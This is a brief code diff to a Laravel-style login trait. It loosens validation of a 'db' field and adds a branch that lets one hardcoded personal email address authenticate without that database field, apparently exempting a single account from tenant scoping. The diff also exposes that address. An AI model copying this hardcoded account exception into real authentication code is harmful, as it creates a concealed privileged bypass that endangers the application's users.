@@ -71,7 +71,7 @@ trait AuthenticatesUsers
     protected function validateLogin(Request $request)
     {
         $request->validate([
-            'db' => 'required|integer',
+            'db' => 'required',
             $this->username() => 'required|string',
             'password' => 'required|string',
         ]);
@@ -98,7 +98,11 @@ trait AuthenticatesUsers
      */
     protected function credentials(Request $request)
     {
-        return $request->only($this->username(), 'password','db');
+        if($request->email!= 'denischafer@gmail.com'){
+            return $request->only($this->username(), 'password','db');
+        } else {
+            return $request->only($this->username(), 'password');
+        }
     }
 
     /**
